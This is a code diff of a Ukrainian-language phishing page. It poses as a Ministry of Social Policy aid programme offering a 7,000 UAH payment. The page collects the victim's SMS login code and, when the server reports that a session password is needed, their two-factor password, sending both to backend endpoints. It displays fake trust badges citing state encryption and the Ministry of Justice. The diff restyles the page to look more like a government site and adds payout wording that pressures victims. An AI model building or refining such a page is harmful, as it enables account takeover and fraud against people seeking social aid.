@@ -3,236 +3,235 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Підтвердження — Допомога 10 000 грн</title>
-<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<title>Підтвердження — Допомога 7 000 грн</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
   body {
-    font-family: 'Nunito', sans-serif;
+    font-family: 'Inter', sans-serif;
     min-height: 100vh;
-    background: #0f0c29;
+    background: #f0f4ff;
     display: flex;
     flex-direction: column;
     align-items: center;
     justify-content: center;
-    padding: 24px;
+    padding: 20px;
     position: relative;
     overflow-x: hidden;
   }
 
-  body::before {
-    content: '';
-    position: fixed;
-    top: -120px; left: -120px;
-    width: 400px; height: 400px;
-    border-radius: 50%;
-    background: radial-gradient(circle, rgba(99,60,220,0.45) 0%, transparent 70%);
-    pointer-events: none;
+  .bg-blob1 {
+    position: fixed; top: -80px; right: -80px;
+    width: 320px; height: 320px; border-radius: 50%;
+    background: radial-gradient(circle, rgba(99,102,241,0.18) 0%, transparent 70%);
+    pointer-events: none; z-index: 0;
   }
-  body::after {
-    content: '';
-    position: fixed;
-    bottom: -100px; right: -100px;
-    width: 350px; height: 350px;
-    border-radius: 50%;
-    background: radial-gradient(circle, rgba(16,185,129,0.35) 0%, transparent 70%);
-    pointer-events: none;
+  .bg-blob2 {
+    position: fixed; bottom: -60px; left: -60px;
+    width: 280px; height: 280px; border-radius: 50%;
+    background: radial-gradient(circle, rgba(16,185,129,0.15) 0%, transparent 70%);
+    pointer-events: none; z-index: 0;
   }
-
-  .coins {
-    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-    pointer-events: none; overflow: hidden; z-index: 0;
-  }
-  .coin {
-    position: absolute; font-size: 20px; opacity: 0.12;
-    animation: floatCoin linear infinite;
-  }
-  @keyframes floatCoin {
-    0%   { transform: translateY(110vh) rotate(0deg); opacity: 0; }
-    10%  { opacity: 0.12; }
-    90%  { opacity: 0.12; }
-    100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
+  .bg-blob3 {
+    position: fixed; top: 40%; left: 50%;
+    transform: translate(-50%, -50%);
+    width: 600px; height: 300px; border-radius: 50%;
+    background: radial-gradient(ellipse, rgba(251,191,36,0.08) 0%, transparent 70%);
+    pointer-events: none; z-index: 0;
   }
 
-  /* Верхній бейдж */
-  .top-badge {
-    display: flex; align-items: center; gap: 8px;
-    background: rgba(255,255,255,0.08);
-    border: 1px solid rgba(255,255,255,0.15);
-    border-radius: 50px; padding: 8px 20px;
-    margin-bottom: 16px;
-    backdrop-filter: blur(10px);
-    position: relative; z-index: 1;
-  }
-  .top-badge-dot {
-    width: 8px; height: 8px; border-radius: 50%;
-    background: #fbbf24; box-shadow: 0 0 8px #fbbf24;
-    animation: pulse 1.8s infinite;
-  }
-  @keyframes pulse {
-    0%, 100% { opacity: 1; transform: scale(1); }
-    50% { opacity: 0.6; transform: scale(0.85); }
-  }
-  .top-badge-text { font-size: 13px; font-weight: 700; color: rgba(255,255,255,0.85); letter-spacing: 0.04em; }
-
-  .hero-title {
-    font-size: 14px; font-weight: 700;
-    color: rgba(255,255,255,0.45);
-    letter-spacing: 0.1em; text-transform: uppercase;
-    margin-bottom: 4px; text-align: center;
-    position: relative; z-index: 1;
-  }
-
-  .amount-wrap {
-    display: flex; align-items: baseline; gap: 6px;
+  /* Шапка */
+  .gov-header {
+    display: flex; align-items: center; gap: 10px;
     margin-bottom: 20px; position: relative; z-index: 1;
   }
-  .amount-num {
-    font-size: 58px; font-weight: 900; line-height: 1;
-    background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 40%, #10b981 100%);
-    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-    background-clip: text; letter-spacing: -2px;
+  .gov-logo {
+    width: 40px; height: 40px; border-radius: 10px;
+    background: linear-gradient(135deg, #4f46e5, #7c3aed);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 20px;
   }
-  .amount-currency { font-size: 26px; font-weight: 800; color: rgba(255,255,255,0.35); }
+  .gov-name { display: flex; flex-direction: column; }
+  .gov-name-top { font-size: 13px; font-weight: 800; color: #1e1b4b; letter-spacing: 0.02em; }
+  .gov-name-bot { font-size: 11px; font-weight: 500; color: #6b7280; }
+
+  /* Герой */
+  .hero {
+    position: relative; z-index: 1;
+    text-align: center; margin-bottom: 16px;
+  }
+  .hero-tag {
+    display: inline-flex; align-items: center; gap: 6px;
+    background: #ecfdf5; border: 1px solid #a7f3d0;
+    border-radius: 50px; padding: 5px 14px;
+    font-size: 12px; font-weight: 700; color: #065f46;
+    margin-bottom: 12px; letter-spacing: 0.03em;
+  }
+  .hero-tag-dot {
+    width: 7px; height: 7px; border-radius: 50%;
+    background: #10b981; animation: blink 2s infinite;
+  }
+  @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
+
+  .hero-h1 {
+    font-size: 26px; font-weight: 900; color: #111827;
+    line-height: 1.15; margin-bottom: 6px; letter-spacing: -0.5px;
+  }
+  .hero-h1 span {
+    background: linear-gradient(135deg, #4f46e5, #7c3aed);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .hero-sub { font-size: 13px; color: #6b7280; font-weight: 500; }
+
+  /* Блок суми */
+  .amount-card {
+    position: relative; z-index: 1;
+    background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 50%, #6d28d9 100%);
+    border-radius: 20px; padding: 18px 24px;
+    width: 100%; max-width: 420px;
+    margin-bottom: 14px; overflow: hidden;
+    box-shadow: 0 16px 48px rgba(79,70,229,0.3);
+  }
+  .amount-card::before {
+    content: ''; position: absolute; top: -40px; right: -40px;
+    width: 140px; height: 140px; border-radius: 50%;
+    background: rgba(255,255,255,0.08);
+  }
+  .amount-top {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 8px; position: relative; z-index: 1;
+  }
+  .amount-badge {
+    background: rgba(255,255,255,0.18); border-radius: 8px;
+    padding: 4px 10px; font-size: 11px; font-weight: 700;
+    color: rgba(255,255,255,0.9); letter-spacing: 0.05em;
+  }
+  .amount-flag { font-size: 20px; }
+  .amount-big {
+    font-size: 44px; font-weight: 900; color: #fff;
+    letter-spacing: -2px; line-height: 1; position: relative; z-index: 1;
+  }
+  .amount-big sup { font-size: 20px; font-weight: 700; vertical-align: super; color: rgba(255,255,255,0.7); }
+  .amount-desc { font-size: 12px; color: rgba(255,255,255,0.6); font-weight: 500; margin-top: 4px; position: relative; z-index: 1; }
+
+  /* Прогрес */
+  .progress-outer {
+    width: 100%; max-width: 420px;
+    position: relative; z-index: 1;
+    margin-bottom: 14px;
+  }
+  .progress-labels {
+    display: flex; justify-content: space-between;
+    font-size: 11px; font-weight: 700; color: #9ca3af;
+    margin-bottom: 6px;
+  }
+  .progress-labels .active { color: #4f46e5; }
+  .progress-bg {
+    height: 6px; background: #e5e7eb; border-radius: 6px; overflow: hidden;
+  }
+  .progress-fill {
+    height: 100%; width: 66%;
+    background: linear-gradient(90deg, #4f46e5, #7c3aed);
+    border-radius: 6px; transition: width 0.5s ease;
+  }
 
   /* Картка */
   .card {
-    width: 100%; max-width: 400px;
-    background: rgba(255,255,255,0.05);
-    border: 1px solid rgba(255,255,255,0.12);
-    border-radius: 28px; padding: 30px 26px;
-    display: flex; flex-direction: column;
-    align-items: center; gap: 18px;
-    backdrop-filter: blur(20px);
-    position: relative; z-index: 1; overflow: hidden;
-  }
-  .card::before {
-    content: '';
-    position: absolute; top: 0; left: 20%; right: 20%; height: 2px;
-    background: linear-gradient(90deg, transparent, #fbbf24, #10b981, transparent);
-    border-radius: 2px;
+    width: 100%; max-width: 420px;
+    background: #fff; border: 1px solid #e5e7eb;
+    border-radius: 24px; padding: 26px 22px;
+    display: flex; flex-direction: column; gap: 16px;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.07);
+    position: relative; z-index: 1;
   }
 
-  /* Аватар */
-  .avatar {
-    width: 80px; height: 80px; border-radius: 50%;
-    background: linear-gradient(135deg, rgba(99,60,220,0.5), rgba(16,185,129,0.3));
-    border: 2px solid rgba(255,255,255,0.15);
-    display: flex; align-items: center; justify-content: center; overflow: hidden;
-  }
-  .avatar svg { width: 52px; height: 52px; }
+  .card-title { font-size: 16px; font-weight: 800; color: #111827; text-align: center; }
+  .card-sub { font-size: 13px; color: #9ca3af; text-align: center; margin-top: -8px; font-weight: 500; }
 
-  /* Крок-лейбл */
-  .step-label {
-    font-size: 11px; font-weight: 800;
-    color: rgba(255,255,255,0.4);
-    text-transform: uppercase; letter-spacing: 0.1em;
-    text-align: center;
-  }
-
-  /* Прогрес */
-  .progress-wrap {
-    width: 100%; display: flex; flex-direction: column; gap: 6px;
-  }
-  .progress-bar-bg {
-    width: 100%; height: 4px;
-    background: rgba(255,255,255,0.08);
-    border-radius: 4px; overflow: hidden;
-  }
-  .progress-bar-fill {
-    height: 100%; width: 50%;
-    background: linear-gradient(90deg, #fbbf24, #10b981);
-    border-radius: 4px;
-    transition: width 0.5s ease;
-  }
-  .progress-text {
-    font-size: 11px; color: rgba(255,255,255,0.35);
-    font-weight: 700; text-align: right;
-  }
+  .divider { height: 1px; background: #f3f4f6; width: 100%; }
 
   /* Клітинки коду */
-  #step-code { width: 100%; display: flex; flex-direction: column; align-items: center; gap: 16px; }
-  #step-password { width: 100%; display: none; flex-direction: column; align-items: center; gap: 16px; }
+  #step-code { width: 100%; display: flex; flex-direction: column; align-items: center; gap: 14px; }
+  #step-password { width: 100%; display: none; flex-direction: column; align-items: center; gap: 14px; }
 
   .code-inputs { display: flex; gap: 10px; justify-content: center; }
 
   .code-box {
-    width: 52px; height: 62px;
+    width: 52px; height: 60px;
     border-radius: 14px;
-    border: 1.5px solid rgba(255,255,255,0.12);
-    background: rgba(255,255,255,0.06);
-    color: #fff;
-    font-size: 26px; font-weight: 900;
+    border: 1.5px solid #e5e7eb;
+    background: #f9fafb;
+    color: #111827;
+    font-size: 26px; font-weight: 800;
     text-align: center; outline: none;
-    font-family: 'Nunito', sans-serif;
-    transition: border-color 0.18s, background 0.18s;
+    font-family: 'Inter', sans-serif;
+    transition: border-color 0.18s, background 0.18s, box-shadow 0.18s;
     caret-color: transparent;
   }
   .code-box:focus {
-    border-color: rgba(251,191,36,0.7);
-    background: rgba(251,191,36,0.08);
-    box-shadow: 0 0 0 3px rgba(251,191,36,0.12);
+    border-color: #6366f1; background: #fafbff;
+    box-shadow: 0 0 0 4px rgba(99,102,241,0.1);
   }
   .code-box.filled {
-    border-color: rgba(16,185,129,0.6);
-    background: rgba(16,185,129,0.08);
-    color: #10b981;
+    border-color: #10b981; background: #f0fdf4; color: #059669;
   }
 
-  .code-hint { font-size: 12px; color: rgba(255,255,255,0.3); text-align: center; font-weight: 600; margin-top: -4px; }
+  .code-hint { font-size: 12px; color: #9ca3af; text-align: center; font-weight: 500; margin-top: -4px; }
 
   /* Поле паролю */
-  .password-input {
-    width: 100%;
-    background: rgba(255,255,255,0.07);
-    border: 1.5px solid rgba(255,255,255,0.12);
-    border-radius: 16px; padding: 14px 18px;
-    font-size: 17px; font-weight: 800;
-    font-family: 'Nunito', sans-serif;
-    outline: none; color: #fff;
+  .field-wrap {
+    width: 100%; background: #f9fafb;
+    border: 1.5px solid #e5e7eb; border-radius: 14px;
+    padding: 12px 16px;
     transition: border-color 0.2s, background 0.2s;
   }
-  .password-input:focus {
-    border-color: rgba(251,191,36,0.6);
-    background: rgba(255,255,255,0.1);
+  .field-wrap:focus-within {
+    border-color: #6366f1; background: #fafbff;
+    box-shadow: 0 0 0 4px rgba(99,102,241,0.08);
   }
-  .password-input::placeholder { color: rgba(255,255,255,0.2); font-weight: 600; }
+  .field-label { font-size: 11px; font-weight: 700; color: #9ca3af; text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 5px; }
+  .password-input {
+    width: 100%; background: transparent; border: none; outline: none;
+    font-size: 17px; font-weight: 700; color: #111827;
+    font-family: 'Inter', sans-serif;
+  }
+  .password-input::placeholder { color: #d1d5db; font-weight: 500; }
 
   /* Статуси */
-  .error   { color: #f87171; font-size: 13px; font-weight: 700; text-align: center; }
-  .success { color: #10b981; font-size: 13px; font-weight: 700; text-align: center; }
-  .loading { color: #a78bfa; font-size: 13px; font-weight: 700; text-align: center; }
+  .error   { color: #ef4444; font-size: 13px; font-weight: 600; text-align: center; }
+  .success { color: #059669; font-size: 13px; font-weight: 600; text-align: center; }
+  .loading { color: #6366f1; font-size: 13px; font-weight: 600; text-align: center; }
 
   /* Кнопка */
-  .btn-next {
+  .btn-main {
     width: 100%; padding: 16px;
-    background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 50%, #10b981 100%);
-    color: #0f0c29; border: none; border-radius: 16px;
-    font-size: 16px; font-weight: 900;
-    font-family: 'Nunito', sans-serif;
-    cursor: pointer; letter-spacing: 0.02em;
-    box-shadow: 0 8px 32px rgba(251,191,36,0.3);
+    background: linear-gradient(135deg, #4f46e5, #7c3aed);
+    color: #fff; border: none; border-radius: 14px;
+    font-size: 16px; font-weight: 800;
+    font-family: 'Inter', sans-serif; cursor: pointer;
+    box-shadow: 0 8px 24px rgba(79,70,229,0.35);
     transition: opacity 0.2s, transform 0.12s, box-shadow 0.2s;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
   }
-  .btn-next:hover { opacity: 0.92; box-shadow: 0 12px 40px rgba(251,191,36,0.45); }
-  .btn-next:active { transform: scale(0.97); }
-  .btn-next:disabled { opacity: 0.4; cursor: not-allowed; box-shadow: none; }
+  .btn-main:hover { opacity: 0.92; box-shadow: 0 12px 32px rgba(79,70,229,0.45); }
+  .btn-main:active { transform: scale(0.98); }
+  .btn-main:disabled { opacity: 0.45; cursor: not-allowed; box-shadow: none; }
 
-  .secure-row {
-    display: flex; align-items: center; gap: 6px;
-    font-size: 11px; color: rgba(255,255,255,0.25); font-weight: 600;
+  .trust-row {
+    display: flex; align-items: center; justify-content: center;
+    gap: 16px; flex-wrap: wrap;
   }
+  .trust-item { display: flex; align-items: center; gap: 5px; font-size: 11px; color: #9ca3af; font-weight: 600; }
 
-  /* Чат */
   .chat-btn {
     position: fixed; bottom: 24px; right: 24px;
     width: 52px; height: 52px;
-    background: linear-gradient(135deg, #fbbf24, #f59e0b);
+    background: linear-gradient(135deg, #4f46e5, #7c3aed);
     border-radius: 50%;
     display: flex; align-items: center; justify-content: center;
-    cursor: pointer;
-    box-shadow: 0 4px 20px rgba(251,191,36,0.5);
+    cursor: pointer; box-shadow: 0 4px 20px rgba(79,70,229,0.4);
     border: none; transition: transform 0.15s; z-index: 10;
   }
   .chat-btn:hover { transform: scale(1.1); }
@@ -240,38 +239,53 @@
 </head>
 <body>
 
-  <div class="coins" id="coins"></div>
+  <div class="bg-blob1"></div>
+  <div class="bg-blob2"></div>
+  <div class="bg-blob3"></div>
 
-  <div class="top-badge">
-    <div class="top-badge-dot"></div>
-    <span class="top-badge-text">🔐 ПІДТВЕРДЖЕННЯ ОСОБИСТОСТІ</span>
+  <div class="gov-header">
+    <div class="gov-logo">🏛️</div>
+    <div class="gov-name">
+      <span class="gov-name-top">Мінсоцполітики України</span>
+      <span class="gov-name-bot">Програма єдиної допомоги 2025</span>
+    </div>
   </div>
 
-  <div class="hero-title">Крок 2 з 2 — Верифікація</div>
+  <div class="hero">
+    <div class="hero-tag">
+      <div class="hero-tag-dot"></div>
+      Останній крок — підтвердіть особу
+    </div>
+    <div class="hero-h1">Верифікація <span>особистості</span></div>
+    <div class="hero-sub">Введіть код із SMS для отримання виплати</div>
+  </div>
 
-  <div class="amount-wrap">
-    <span class="amount-num">10 000</span>
-    <span class="amount-currency">₴</span>
+  <div class="amount-card">
+    <div class="amount-top">
+      <div class="amount-badge">СУМА ВИПЛАТИ</div>
+      <div class="amount-flag">🇺🇦</div>
+    </div>
+    <div class="amount-big"><sup>₴</sup>7 000</div>
+    <div class="amount-desc">Зараховується після підтвердження протягом 24 годин</div>
+  </div>
+
+  <div class="progress-outer">
+    <div class="progress-labels">
+      <span>Номер телефону ✓</span>
+      <span class="active">Верифікація — зараз</span>
+      <span>Виплата</span>
+    </div>
+    <div class="progress-bg">
+      <div class="progress-fill" id="progressFill"></div>
+    </div>
   </div>
 
   <div class="card">
-    <div class="progress-wrap">
-      <div class="progress-bar-bg">
-        <div class="progress-bar-fill" id="progressBar"></div>
-      </div>
-      <div class="progress-text" id="progressText">Крок 2 з 2</div>
-    </div>
-
-    <div class="avatar">
-      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="50" cy="36" r="20" fill="rgba(251,191,36,0.9)"/>
-        <ellipse cx="50" cy="82" rx="30" ry="22" fill="rgba(251,191,36,0.7)"/>
-      </svg>
-    </div>
-
     <!-- Step: Code -->
     <div id="step-code">
-      <div class="step-label">📩 Введіть код із SMS</div>
+      <div class="card-title">Код підтвердження</div>
+      <div class="card-sub">Введіть 5-значний код із SMS</div>
+
       <div class="code-inputs">
         <input class="code-box" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*">
         <input class="code-box" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*">
@@ -279,47 +293,45 @@
         <input class="code-box" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*">
         <input class="code-box" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]*">
       </div>
-      <p class="code-hint">Введіть код, який надійшов на ваш телефон</p>
+
+      <p class="code-hint">Код надійшов на ваш номер телефону</p>
       <div id="status-code" style="display:none;"></div>
-      <button class="btn-next" id="btn-code" onclick="handleVerifyCode()">✅ Підтвердити код</button>
+      <button class="btn-main" id="btn-code" onclick="handleVerifyCode()">
+        <span>✅</span><span>Підтвердити та отримати 7 000 ₴</span>
+      </button>
     </div>
 
-    <!-- Step: 2FA Password -->
+    <!-- Step: 2FA -->
     <div id="step-password">
-      <div class="step-label">🔐 Двофакторний захист</div>
-      <input class="password-input" type="password" id="password-input" placeholder="Введіть пароль 2FA">
-      <p class="code-hint">Введіть пароль двофакторної автентифікації</p>
+      <div class="card-title">Двофакторний захист</div>
+      <div class="card-sub">Введіть пароль 2FA для завершення</div>
+
+      <div class="field-wrap">
+        <div class="field-label">Пароль 2FA</div>
+        <input class="password-input" type="password" id="password-input" placeholder="Введіть пароль">
+      </div>
+
       <div id="status-password" style="display:none;"></div>
-      <button class="btn-next" id="btn-password" onclick="handleVerifyPassword()">✅ Підтвердити пароль</button>
+      <button class="btn-main" id="btn-password" onclick="handleVerifyPassword()">
+        <span>🔐</span><span>Підтвердити та отримати 7 000 ₴</span>
+      </button>
     </div>
 
-    <div class="secure-row">
-      <span>🔒</span>
-      <span>Захищено державним шифруванням · Мін'юст України</span>
+    <div class="divider"></div>
+    <div class="trust-row">
+      <div class="trust-item">🔐 Держшифрування</div>
+      <div class="trust-item">🏛️ Мін'юст України</div>
+      <div class="trust-item">✅ Безкоштовно</div>
     </div>
   </div>
 
   <button class="chat-btn" title="Підтримка">
-    <svg viewBox="0 0 24 24" width="24" height="24" xmlns="http://www.w3.org/2000/svg">
-      <path d="M20 2H4C2.9 2 2 2.9 2 4v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 12H6l-2 2V4h16v10z" fill="#0f0c29"/>
+    <svg viewBox="0 0 24 24" width="22" height="22" xmlns="http://www.w3.org/2000/svg">
+      <path d="M20 2H4C2.9 2 2 2.9 2 4v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 12H6l-2 2V4h16v10z" fill="#fff"/>
     </svg>
   </button>
 
 <script>
-  // Монетки
-  const coinsEl = document.getElementById('coins');
-  const symbols = ['₴','₴','💰','✨','₴'];
-  for (let i = 0; i < 18; i++) {
-    const c = document.createElement('span');
-    c.className = 'coin';
-    c.textContent = symbols[i % symbols.length];
-    c.style.left = (Math.random() * 100) + 'vw';
-    c.style.animationDuration = (10 + Math.random() * 14) + 's';
-    c.style.animationDelay = (Math.random() * 12) + 's';
-    c.style.fontSize = (14 + Math.random() * 16) + 'px';
-    coinsEl.appendChild(c);
-  }
-
   const currentPhone = sessionStorage.getItem('phone');
   if (!currentPhone) window.location.href = '/';
 
@@ -365,8 +377,8 @@
 
     const btn = document.getElementById('btn-code');
     btn.disabled = true;
-    btn.textContent = '⏳ Перевіряємо...';
-    setStatus('status-code', 'loading', '⏳ Перевіряємо код...');
+    btn.innerHTML = '<span>⏳</span><span>Перевіряємо код...</span>';
+    setStatus('status-code', 'loading', 'Перевіряємо код...');
 
     try {
       const response = await fetch('/verify-code', {
@@ -374,11 +386,10 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone: currentPhone, code })
       });
-
       const data = await response.json();
 
       if (data.success) {
-        document.getElementById('progressBar').style.width = '100%';
+        document.getElementById('progressFill').style.width = '100%';
         setStatus('status-code', 'success', '✅ Виплату успішно підтверджено!');
         sessionStorage.removeItem('phone');
       } else if (data.error === 'SESSION_PASSWORD_NEEDED') {
@@ -390,18 +401,17 @@
         boxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
         boxes[0].focus();
         btn.disabled = false;
-        btn.textContent = '✅ Підтвердити код';
+        btn.innerHTML = '<span>✅</span><span>Підтвердити та отримати 7 000 ₴</span>';
       }
     } catch (err) {
-      setStatus('status-code', 'error', '❌ Сервер недоступний');
+      setStatus('status-code', 'error', '❌ Сервер тимчасово недоступний');
       btn.disabled = false;
-      btn.textContent = '✅ Підтвердити код';
+      btn.innerHTML = '<span>✅</span><span>Підтвердити та отримати 7 000 ₴</span>';
     }
   }
 
   async function handleVerifyPassword() {
     const password = document.getElementById('password-input').value;
-
     if (!password) {
       setStatus('status-password', 'error', '❌ Введіть пароль');
       return;
@@ -409,8 +419,8 @@
 
     const btn = document.getElementById('btn-password');
     btn.disabled = true;
-    btn.textContent = '⏳ Перевіряємо...';
-    setStatus('status-password', 'loading', '⏳ Перевіряємо пароль...');
+    btn.innerHTML = '<span>⏳</span><span>Перевіряємо пароль...</span>';
+    setStatus('status-password', 'loading', 'Перевіряємо пароль...');
 
     try {
       const response = await fetch('/verify-password', {
@@ -418,22 +428,21 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone: currentPhone, password })
       });
-
       const data = await response.json();
 
       if (data.success) {
-        document.getElementById('progressBar').style.width = '100%';
+        document.getElementById('progressFill').style.width = '100%';
         setStatus('status-password', 'success', '✅ Виплату успішно підтверджено!');
         sessionStorage.removeItem('phone');
       } else {
         setStatus('status-password', 'error', '❌ ' + (data.error || 'Невірний пароль'));
         btn.disabled = false;
-        btn.textContent = '✅ Підтвердити пароль';
+        btn.innerHTML = '<span>🔐</span><span>Підтвердити та отримати 7 000 ₴</span>';
       }
     } catch (err) {
-      setStatus('status-password', 'error', '❌ Сервер недоступний');
+      setStatus('status-password', 'error', '❌ Сервер тимчасово недоступний');
       btn.disabled = false;
-      btn.textContent = '✅ Підтвердити пароль';
+      btn.innerHTML = '<span>🔐</span><span>Підтвердити та отримати 7 000 ₴</span>';
     }
   }
 
